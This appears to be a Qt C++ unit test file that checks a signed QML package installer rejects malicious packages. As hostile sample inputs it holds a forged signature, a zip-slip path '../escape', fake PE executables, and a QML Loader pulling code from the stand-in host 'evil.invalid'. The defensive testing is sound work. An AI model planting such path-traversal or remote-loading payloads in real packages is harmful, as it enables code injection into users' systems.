#include "Archive.h"
#include "ContentDigest.h"
#include "PackageInstaller.h"
#include "PackageStore.h"
#include "QmlSourcePolicy.h"
#include "SignatureVerifier.h"

#include <QFile>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QTemporaryDir>
#include <QTest>

namespace {
QByteArray manifest(const QString &version,
                    const QStringList &imports = {QStringLiteral("QtQuick")})
{
    QJsonArray importArray;
    for (const QString &entry : imports) importArray.append(entry);
    return QJsonDocument(QJsonObject{
        {QStringLiteral("schemaVersion"), 1},
        {QStringLiteral("appId"), QStringLiteral("company.security")},
        {QStringLiteral("version"), version},
        {QStringLiteral("entryPoint"), QStringLiteral("qml/Main.qml")},
        {QStringLiteral("runtime"),
         QJsonObject{{QStringLiteral("minVersion"), QStringLiteral("1.0.0")},
                     {QStringLiteral("maxVersion"), QStringLiteral("1.x")}}},
        {QStringLiteral("imports"), importArray},
        {QStringLiteral("permissions"), QJsonObject{}},
        {QStringLiteral("limits"),
         QJsonObject{{QStringLiteral("packageBytes"), 1048576},
                     {QStringLiteral("memoryMiB"), 128},
                     {QStringLiteral("processes"), 1}}},
        {QStringLiteral("routes"), QJsonArray{QStringLiteral("/")}}})
        .toJson(QJsonDocument::Compact);
}

QString signedPackage(QTemporaryDir &temporary,
                      const QString &name,
                      const QByteArray &privateKey,
                      QByteArray qml = QByteArrayLiteral("import QtQuick\nItem {}"),
                      const QStringList &imports = {QStringLiteral("QtQuick")},
                      QVector<ArchiveFile> extras = {})
{
    QVector<ArchiveFile> files{{QByteArrayLiteral("manifest.json"), manifest(name, imports)},
                               {QByteArrayLiteral("qml/Main.qml"), std::move(qml)}};
    files.append(std::move(extras));
    const auto payload = ContentDigest::payload(files);
    if (!payload.hasValue()) return {};
    files.push_back({QByteArrayLiteral("metadata/content.sha256"), payload.hex()});
    const auto digest = ContentDigest::signedPackage(files);
    if (!digest.hasValue()) return {};
    const auto signature = SignatureVerifier::signPem(digest.bytes(), privateKey);
    if (!signature.hasValue()) return {};
    files.push_back({QByteArrayLiteral("metadata/signature.ed25519"), signature.value()});
    const QString path = temporary.filePath(name + QStringLiteral(".qapkg"));
    return Archive::createFromFiles(files, path).hasValue() ? path : QString{};
}

InstallPolicy policy()
{
    InstallPolicy result;
    result.expectedAppId = QStringLiteral("company.security");
    result.runtimeVersion = QStringLiteral("1.2.0");
    result.allowedImports = {QStringLiteral("QtQuick")};
    result.preflight = [](const Manifest &, const QString &) { return true; };
    return result;
}
}

class MaliciousPackageTest final : public QObject
{
    Q_OBJECT
private slots:
    void rejectsWrongKeyAndSignedPayloadTamper();
    void rejectsZipSlipCanonicalCollisionAndResourceBombs();
    void rejectsNativeCodeForbiddenImportsAndRemoteSources();
};

void MaliciousPackageTest::rejectsWrongKeyAndSignedPayloadTamper()
{
    QTemporaryDir temporary;
    QVERIFY(temporary.isValid());
    const auto trusted = SignatureVerifier::generateKeyPair();
    const auto attacker = SignatureVerifier::generateKeyPair();
    QVERIFY(trusted.hasValue());
    QVERIFY(attacker.hasValue());
    PackageStore store(temporary.filePath(QStringLiteral("store")));
    PackageInstaller installer(store, trusted.value().publicKeyPem, policy());

    const QString wrongKey = signedPackage(temporary, QStringLiteral("1.0.0"),
                                           attacker.value().privateKeyPem);
    QVERIFY(!wrongKey.isEmpty());
    const InstallResult wrong = installer.install(wrongKey);
    QVERIFY(!wrong.succeeded());
    QCOMPARE(wrong.error, InstallError::SignatureInvalid);

    const QString valid = signedPackage(temporary, QStringLiteral("1.0.1"),
                                        trusted.value().privateKeyPem);
    const auto snapshot = Archive::snapshot(valid);
    QVERIFY(snapshot.hasValue());
    QVector<ArchiveFile> changed = snapshot.files();
    for (ArchiveFile &file : changed) {
        if (file.path == QByteArrayLiteral("qml/Main.qml")) file.contents.append("\nItem {}");
    }
    const QString tampered = temporary.filePath(QStringLiteral("tampered.qapkg"));
    QVERIFY(Archive::createFromFiles(changed, tampered).hasValue());
    const InstallResult mutation = installer.install(tampered);
    QVERIFY(!mutation.succeeded());
    QCOMPARE(mutation.error, InstallError::SignatureInvalid);
    QVERIFY(store.resolveCurrent(QStringLiteral("company.security")).path.isEmpty());
}

void MaliciousPackageTest::rejectsZipSlipCanonicalCollisionAndResourceBombs()
{
    QTemporaryDir temporary;
    QVERIFY(temporary.isValid());
    const QString output = temporary.filePath(QStringLiteral("invalid.qapkg"));
    const auto traversal = Archive::createFromFiles(
        {{QByteArrayLiteral("../escape"), QByteArrayLiteral("x")}}, output);
    QVERIFY(!traversal.hasValue());
    QCOMPARE(traversal.error().code, ArchiveErrorCode::InvalidEntryPath);

    const auto collision = Archive::createFromFiles(
        {{QByteArrayLiteral("qml/Main.qml"), QByteArrayLiteral("a")},
         {QByteArrayLiteral("QML/main.qml"), QByteArrayLiteral("b")}}, output);
    QVERIFY(!collision.hasValue());
    QCOMPARE(collision.error().code, ArchiveErrorCode::DuplicateEntryPath);

    ArchiveLimits limits;
    limits.maximumEntryBytes = 4;
    limits.maximumTotalBytes = 4;
    const auto bomb = Archive::createFromFiles(
        {{QByteArrayLiteral("payload.bin"), QByteArray(5, 'x')}}, output, limits);
    QVERIFY(!bomb.hasValue());
    QVERIFY(bomb.error().code == ArchiveErrorCode::EntrySizeLimit
            || bomb.error().code == ArchiveErrorCode::TotalSizeLimit);
}

void MaliciousPackageTest::rejectsNativeCodeForbiddenImportsAndRemoteSources()
{
    QTemporaryDir temporary;
    QVERIFY(temporary.isValid());
    const auto keys = SignatureVerifier::generateKeyPair();
    QVERIFY(keys.hasValue());
    PackageStore store(temporary.filePath(QStringLiteral("store")));
    PackageInstaller installer(store, keys.value().publicKeyPem, policy());

    const QString nativePackage = signedPackage(
        temporary, QStringLiteral("1.1.0"), keys.value().privateKeyPem,
        QByteArrayLiteral("import QtQuick\nItem {}"), {QStringLiteral("QtQuick")},
        {{QByteArrayLiteral("qml/evil.dll"), QByteArrayLiteral("MZ")}});
    const InstallResult native = installer.install(nativePackage);
    QVERIFY(!native.succeeded());
    QCOMPARE(native.error, InstallError::PreflightRejected);

    const QString executablePackage = signedPackage(
        temporary, QStringLiteral("1.1.1"), keys.value().privateKeyPem,
        QByteArrayLiteral("import QtQuick\nItem {}"), {QStringLiteral("QtQuick")},
        {{QByteArrayLiteral("assets/evil.exe"), QByteArrayLiteral("MZ")}});
    const InstallResult executable = installer.install(executablePackage);
    QVERIFY(!executable.succeeded());
    QCOMPARE(executable.error, InstallError::PreflightRejected);

    const QString renamedPePackage = signedPackage(
        temporary, QStringLiteral("1.1.2"), keys.value().privateKeyPem,
        QByteArrayLiteral("import QtQuick\nItem {}"), {QStringLiteral("QtQuick")},
        {{QByteArrayLiteral("assets/logo.bin"), QByteArrayLiteral("MZpayload")}});
    const InstallResult renamedPe = installer.install(renamedPePackage);
    QVERIFY(!renamedPe.succeeded());
    QCOMPARE(renamedPe.error, InstallError::PreflightRejected);

    const QString deniedImport = signedPackage(
        temporary, QStringLiteral("1.1.3"), keys.value().privateKeyPem,
        QByteArrayLiteral("import Company.Runtime\nItem {}"),
        {QStringLiteral("Company.Runtime")});
    const InstallResult denied = installer.install(deniedImport);
    QVERIFY(!denied.succeeded());
    QCOMPARE(denied.error, InstallError::ImportDenied);

    const QByteArray remoteSource = QByteArrayLiteral(
        "import QtQuick\nItem { Loader { source: \"https://evil.invalid/x.qml\" } }");
    QVERIFY(QmlSourcePolicy::violations(remoteSource).contains(
        QStringLiteral("dynamic-loader-source")));
    const QString remotePackage = signedPackage(
        temporary, QStringLiteral("1.1.4"), keys.value().privateKeyPem, remoteSource);
    const InstallResult remote = installer.install(remotePackage);
    QVERIFY(!remote.succeeded());
    QCOMPARE(remote.error, InstallError::PreflightRejected);
}

QTEST_MAIN(MaliciousPackageTest)
#include "tst_malicious_package.moc"
